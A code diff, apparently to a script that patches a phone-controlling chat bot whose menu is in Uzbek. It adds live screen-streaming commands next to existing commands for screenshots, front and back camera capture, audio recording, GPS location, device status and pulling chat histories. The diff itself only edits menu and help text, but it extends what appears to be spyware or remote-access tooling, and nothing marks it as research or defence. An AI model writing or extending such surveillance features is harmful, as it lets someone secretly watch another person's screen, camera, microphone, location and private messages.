@@ -6,6 +6,8 @@ path = Path("/opt/hullas/bot.py")
 text = path.read_text()
 
 menu_add = '''    ("screenshot", "Ekran nusxasi"),
+    ("live_start", "Live ekran (2-3 sek)"),
+    ("live_stop", "Live to'xtatish"),
     ("cam_back", "Orqa kamera"),
     ("cam_front", "Old kamera"),
     ("record", "Audio yozish: /record 15"),
@@ -19,8 +21,18 @@ if '("screenshot"' not in text:
         menu_add + '    ("start", "Yordam / barcha buyruqlar"),\n]',
     )
 
+if '("live_start"' not in text:
+    text = text.replace(
+        '    ("screenshot", "Ekran nusxasi"),\n',
+        '    ("screenshot", "Ekran nusxasi"),\n'
+        '    ("live_start", "Live ekran (2-3 sek)"),\n'
+        '    ("live_stop", "Live to\'xtatish"),\n',
+    )
+
 start_add = (
     "/screenshot — Ekran nusxasi\n"
+    "/live_start — Live ekran (har 2-3 sek)\n"
+    "/live_stop — Live to'xtatish\n"
     "/cam_back — Orqa kamera\n"
     "/cam_front — Old kamera\n"
     "/record 15 — Audio yozish\n"
@@ -28,16 +40,12 @@ start_add = (
     "/device — Telefon holati\n"
 )
 
-if "/screenshot" not in text:
+if "/live_start —" not in text:
     text = text.replace(
-        "/sync_ID — Bitta chat tarixini tortish",
-        "/sync_ID — Bitta chat tarixini tortish\n"
-        "/screenshot — Ekran nusxasi\n"
-        "/cam_back — Orqa kamera\n"
-        "/cam_front — Old kamera\n"
-        "/record 15 — Audio yozish\n"
-        "/location — GPS lokatsiya\n"
-        "/device — Telefon holati",
+        '"/screenshot — Ekran nusxasi\\n"',
+        '"/screenshot — Ekran nusxasi\\n"\n'
+        '            "/live_start — Live ekran (har 2-3 sek)\\n"\n'
+        '            "/live_stop — Live to\'xtatish\\n"',
     )
 
 old_reg = """    if _APP_HANDLERS_AVAILABLE:
